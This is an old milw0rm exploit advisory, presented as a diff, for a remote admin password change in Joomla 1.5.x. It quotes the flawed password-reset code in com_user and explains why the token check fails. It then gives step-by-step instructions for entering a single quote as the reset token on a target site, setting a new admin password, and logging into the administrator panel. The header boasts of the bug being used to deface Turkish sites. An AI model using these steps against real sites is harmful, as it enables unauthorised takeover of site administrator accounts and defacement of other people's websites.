@@ -1,0 +1,90 @@
+#####################################################################################
+####                     Joomla 1.5.x Remote Admin Password Change               ####
+#####################################################################################
+#                                                                                   #
+# Author: d3m0n (d3m0n@o2.pl)                                                       #
+# Greets: GregStar, gorion, d3d!k                                                   #
+#                                                                                   #
+# Polish "hackers" used this bug to deface turkish sites BUAHAHHA nice 0-day pff    #
+#                                                                                   #
+#####################################################################################
+
+
+
+File : /components/com_user/controller.php
+
+#####################################################################################
+Line : 379-399
+ 
+	function confirmreset()
+	{
+		// Check for request forgeries
+		JRequest::checkToken() or die( 'Invalid Token' );
+
+		// Get the input
+		$token = JRequest::getVar('token', null, 'post', 'alnum');              < --- {1} 
+                  
+		// Get the model
+		$model = &$this->getModel('Reset');
+
+		// Verify the token
+		if ($model->confirmReset($token) === false)   < --- {2}
+		{
+			$message = JText::sprintf('PASSWORD_RESET_CONFIRMATION_FAILED', $model->getError());
+			$this->setRedirect('index.php?option=com_user&view=reset&layout=confirm', $message);
+			return false;
+		}
+
+		$this->setRedirect('index.php?option=com_user&view=reset&layout=complete');
+	}
+	
+#####################################################################################
+	
+File : /components/com_user/models/reset.php
+
+Line: 111-130 	
+	
+	
+	
+	function confirmReset($token)
+	{
+		global $mainframe;
+
+		$db	= &JFactory::getDBO();
+		$db->setQuery('SELECT id FROM #__users WHERE block = 0 AND activation = '.$db->Quote($token));  < ---- {3} 
+
+		// Verify the token
+		if (!($id = $db->loadResult()))
+		{
+			$this->setError(JText::_('INVALID_TOKEN'));
+			return false;
+		}
+
+		// Push the token and user id into the session
+		$mainframe->setUserState($this->_namespace.'token',	$token);
+		$mainframe->setUserState($this->_namespace.'id',	$id);
+
+		return true;
+	}
+#####################################################################################
+
+
+
+{1} - Replace ' with empty char
+{3} - If you enter ' in token field then query will be looks like : "SELECT id FROM jos_users WHERE block = 0 AND activation = '' "
+
+
+Example :
+
+
+1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm
+
+2. Write into field "token" char ' and Click OK.
+
+3. Write new password for admin
+
+4. Go to url : target.com/administrator/
+
+5. Login admin with new password
+
+# milw0rm.com [2008-08-12]
